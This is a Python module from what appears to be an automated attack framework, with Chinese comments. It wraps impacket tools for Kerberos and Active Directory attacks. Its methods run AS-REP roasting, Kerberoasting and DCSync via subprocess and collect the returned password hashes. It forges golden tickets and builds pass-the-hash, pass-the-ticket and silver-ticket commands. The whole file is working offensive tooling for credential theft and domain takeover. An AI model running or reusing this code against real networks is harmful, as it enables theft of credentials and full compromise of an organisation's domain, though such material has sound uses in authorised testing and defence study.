# internal_network/kerberos_attacks.py
"""
Kerberos攻击模块

支持:
- AS-REP Roasting: 获取不需要预认证用户的哈希
- Kerberoasting: 获取SPN服务账户的TGS哈希
- Pass the Hash: 使用NTLM哈希认证
- Pass the Ticket: 使用票据认证
- 黄金票据: 域管权限持久化
"""

import os
import subprocess
from typing import Dict, List, Any, Optional
from dataclasses import dataclass


@dataclass
class KerberosConfig:
    """Kerberos攻击配置"""
    domain: str
    dc_ip: str
    username: str = ""
    password: str = ""
    ntlm_hash: str = ""
    realm: str = ""  # 域的Kerberos realm，通常与domain大写相同


class KerberosAttacker:
    """
    Kerberos攻击工具集

    使用impacket工具集实现各种Kerberos攻击
    """

    def __init__(self, config: KerberosConfig = None):
        self.config = config

    # =========================================================================
    # AS-REP Roasting
    # =========================================================================

    def asrep_roast(self, domain: str, users: List[str],
                    dc_ip: str = None) -> Dict:
        """
        AS-REP Roasting攻击

        攻击不需要Kerberos预认证的用户，获取AS-REP中的加密数据

        Args:
            domain: 域名，如 corp.local
            users: 用户名列表
            dc_ip: 域控IP

        Returns:
            包含哈希的结果字典
        """
        dc_ip = dc_ip or (self.config.dc_ip if self.config else None)
        if not dc_ip:
            return {"error": "需要提供域控IP", "success": False}

        results = {
            "attack_type": "asrep_roast",
            "domain": domain,
            "dc_ip": dc_ip,
            "users_checked": len(users),
            "vulnerable_users": [],
            "hashes": []
        }

        # 使用impacket-GetNPUsers
        cmd = [
            "impacket-GetNPUsers",
            f"{domain}/",
            "-usersfile", "-",  # 从stdin读取用户列表
            "-format", "hashcat",
            "-outputfile", "/tmp/asrep_hashes.txt",
            "-dc-ip", dc_ip
        ]

        # 构造用户列表文件内容
        users_content = "\n".join(users)

        # 执行命令
        try:
            result = subprocess.run(
                cmd,
                input=users_content,
                capture_output=True,
                text=True,
                timeout=60
            )

            # 解析输出中的哈希
            if "$krb5asrep$" in result.stdout:
                for line in result.stdout.split("\n"):
                    if "$krb5asrep$" in line:
                        results["hashes"].append(line.strip())

                results["vulnerable_users"] = list(set(
                    h.split(":")[0].split("$")[-1] if ":" in h else "unknown"
                    for h in results["hashes"]
                ))
                results["success"] = True
            else:
                results["success"] = False
                results["message"] = "没有发现不需要预认证的用户"

        except subprocess.TimeoutExpired:
            results["error"] = "命令执行超时"
            results["success"] = False
        except FileNotFoundError:
            results["error"] = "impacket未安装"
            results["success"] = False
            results["install_hint"] = "pip install impacket"
        except Exception as e:
            results["error"] = str(e)
            results["success"] = False

        return results

    def asrep_roast_single(self, domain: str, user: str,
                           dc_ip: str) -> Dict:
        """单个用户的AS-REP Roasting"""
        return self.asrep_roast(domain, [user], dc_ip)

    # =========================================================================
    # Kerberoasting
    # =========================================================================

    def kerberoast(self, domain: str, username: str, password: str,
                   dc_ip: str = None) -> Dict:
        """
        Kerberoasting攻击

        获取SPN服务账户的TGS哈希，可以离线破解

        Args:
            domain: 域名
            username: 已有用户名
            password: 已有密码
            dc_ip: 域控IP

        Returns:
            包含TGS哈希的结果字典
        """
        dc_ip = dc_ip or (self.config.dc_ip if self.config else None)
        if not dc_ip:
            return {"error": "需要提供域控IP", "success": False}

        results = {
            "attack_type": "kerberoasting",
            "domain": domain,
            "dc_ip": dc_ip,
            "hashes": [],
            "spns": []
        }

        # 使用impacket-GetUserSPNs
        cmd = [
            "impacket-GetUserSPNs",
            f"{domain}/{username}:{password}",
            "-request",
            "-format", "hashcat",
            "-dc-ip", dc_ip
        ]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120
            )

            # 解析输出中的TGS哈希
            if "$krb5tgs$" in result.stdout:
                for line in result.stdout.split("\n"):
                    if "$krb5tgs$" in line:
                        results["hashes"].append(line.strip())

                # 提取SPN信息
                for line in result.stdout.split("\n"):
                    if "ServicePrincipalName" in line:
                        spn = line.split(":")[-1].strip()
                        if spn:
                            results["spns"].append(spn)

                results["success"] = True
            else:
                results["success"] = False
                results["output"] = result.stdout[:500]

        except subprocess.TimeoutExpired:
            results["error"] = "命令执行超时"
            results["success"] = False
        except FileNotFoundError:
            results["error"] = "impacket未安装"
            results["success"] = False
        except Exception as e:
            results["error"] = str(e)
            results["success"] = False

        return results

    # =========================================================================
    # Pass the Hash
    # =========================================================================

    def pass_the_hash(self, domain: str, username: str,
                      ntlm_hash: str, target: str,
                      service: str = "smb") -> Dict:
        """
        Pass the Hash攻击

        使用NTLM哈希进行认证，不需要明文密码

        Args:
            domain: 域名
            username: 用户名
            ntlm_hash: NTLM哈希 (LM:NTLM 或 :NTLM)
            target: 目标主机
            service: 服务类型 (smb/wmi/atexec)

        Returns:
            攻击结果
        """
        results = {
            "attack_type": "pass_the_hash",
            "username": username,
            "target": target,
            "service": service
        }

        # 根据服务选择impacket工具
        service_tools = {
            "smb": "impacket-smbexec",
            "wmi": "impacket-wmiexec",
            "at": "impacket-atexec",
            "dcom": "impacket-dcomexec",
        }

        tool = service_tools.get(service, "impacket-smbexec")

        cmd = [
            tool,
            f"{domain}/{username}@{target}",
            "-hashes", ntlm_hash
        ]

        results["command"] = " ".join(cmd)

        # 不自动执行，返回命令让用户决定
        results["success"] = None
        results["note"] = "请在安全环境下执行此命令"

        return results

    # =========================================================================
    # Pass the Ticket
    # =========================================================================

    def pass_the_ticket(self, ccache_file: str, target: str,
                        service: str = "wmi") -> Dict:
        """
        Pass the Ticket攻击

        使用生成的Kerberos票据进行认证

        Args:
            ccache_file: 票据文件路径
            target: 目标主机
            service: 服务类型

        Returns:
            攻击命令
        """
        results = {
            "attack_type": "pass_the_ticket",
            "ccache_file": ccache_file,
            "target": target,
            "commands": []
        }

        # 设置环境变量
        results["commands"].append(f"export KRB5CCNAME={ccache_file}")

        # 执行命令
        if service == "wmi":
            results["commands"].append(f"impacket-wmiexec -k {target}")
        elif service == "smb":
            results["commands"].append(f"impacket-smbexec -k {target}")
        elif service == "psexec":
            results["commands"].append(f"impacket-psexec -k {target}")

        results["success"] = None
        results["note"] = "需要先获取有效的Kerberos票据"

        return results

    # =========================================================================
    # 黄金票据
    # =========================================================================

    def golden_ticket(self, domain: str, domain_sid: str,
                      krbtgt_hash: str, user: str = "Administrator") -> Dict:
        """
        黄金票据生成

        使用krbtgt账户的哈希生成任意用户的Kerberos票据

        Args:
            domain: 域名
            domain_sid: 域SID
            krbtgt_hash: krbtgt账户的NTLM哈希
            user: 要伪造的用户

        Returns:
            票据生成结果
        """
        results = {
            "attack_type": "golden_ticket",
            "domain": domain,
            "user": user
        }

        # 使用impacket-ticketer
        cmd = [
            "impacket-ticketer",
            "-nthash", krbtgt_hash,
            "-domain-sid", domain_sid,
            "-domain", domain,
            user
        ]

        results["command"] = " ".join(cmd)

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60
            )

            if result.returncode == 0:
                # 生成的票据文件名
                ticket_file = f"{user}.ccache"
                results["success"] = True
                results["ticket_file"] = ticket_file
                results["next_steps"] = [
                    f"export KRB5CCNAME={ticket_file}",
                    f"impacket-wmiexec -k <target>"
                ]
            else:
                results["success"] = False
                results["error"] = result.stderr[:200]

        except FileNotFoundError:
            results["error"] = "impacket未安装"
            results["success"] = False
        except Exception as e:
            results["error"] = str(e)
            results["success"] = False

        return results

    # =========================================================================
    # 白银票据
    # =========================================================================

    def silver_ticket(self, domain: str, domain_sid: str,
                      service_hash: str, service: str = "cifs",
                      target: str = "", user: str = "Administrator") -> Dict:
        """
        白银票据生成

        针对特定服务的伪造票据

        Args:
            domain: 域名
            domain_sid: 域SID
            service_hash: 服务账户的NTLM哈希
            service: 服务类型 (cifs/http/ldap等)
            target: 目标服务器
            user: 要伪造的用户

        Returns:
            票据生成结果
        """
        results = {
            "attack_type": "silver_ticket",
            "domain": domain,
            "service": service,
            "user": user
        }

        cmd = [
            "impacket-ticketer",
            "-nthash", service_hash,
            "-domain-sid", domain_sid,
            "-domain", domain,
            "-spn", f"{service}/{target}",
            user
        ]

        results["command"] = " ".join(cmd)
        results["success"] = None
        results["note"] = "白银票据只对特定服务有效"

        return results

    # =========================================================================
    # DCSync
    # =========================================================================

    def dcsync(self, domain: str, username: str, password: str,
               dc_ip: str, target_user: str = "krbtgt") -> Dict:
        """
        DCSync攻击

        模拟域控同步，获取任意用户的密码哈希

        Args:
            domain: 域名
            username: 已有管理员用户名
            password: 已有管理员密码
            dc_ip: 域控IP
            target_user: 目标用户

        Returns:
            包含哈希的结果
        """
        results = {
            "attack_type": "dcsync",
            "domain": domain,
            "dc_ip": dc_ip,
            "target_user": target_user,
            "hashes": {}
        }

        cmd = [
            "impacket-secretsdump",
            f"{domain}/{username}:{password}@{dc_ip}",
            "-just-dc-user", target_user,
            "-outputfile", "/tmp/dcsync_hashes"
        ]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120
            )

            # 解析哈希
            for line in result.stdout.split("\n"):
                if ":" in line and any(x in line for x in ["NTLM", "aes", "ntlm"]):
                    parts = line.split(":")
                    if len(parts) >= 2:
                        hash_type = parts[0].strip()
                        hash_value = parts[1].strip()
                        results["hashes"][hash_type] = hash_value

            if results["hashes"]:
                results["success"] = True
            else:
                results["success"] = False
                results["output"] = result.stdout[:500]

        except FileNotFoundError:
            results["error"] = "impacket未安装"
            results["success"] = False
        except Exception as e:
            results["error"] = str(e)
            results["success"] = False

        return results


# 便捷函数
def asrep_roast(domain: str, users: List[str], dc_ip: str) -> Dict:
    """AS-REP Roasting便捷函数"""
    attacker = KerberosAttacker()
    return attacker.asrep_roast(domain, users, dc_ip)


def kerberoast(domain: str, username: str, password: str, dc_ip: str) -> Dict:
    """Kerberoasting便捷函数"""
    attacker = KerberosAttacker()
    return attacker.kerberoast(domain, username, password, dc_ip)


def dcsync(domain: str, username: str, password: str,
          dc_ip: str, target_user: str = "krbtgt") -> Dict:
    """DCSync便捷函数"""
    attacker = KerberosAttacker()
    return attacker.dcsync(domain, username, password, dc_ip, target_user)


def register():
    """注册Kerberos攻击工具"""
    # KerberosAttacker是纯Python类，不直接注册为工具
    # 但被internal_network节点调用
    pass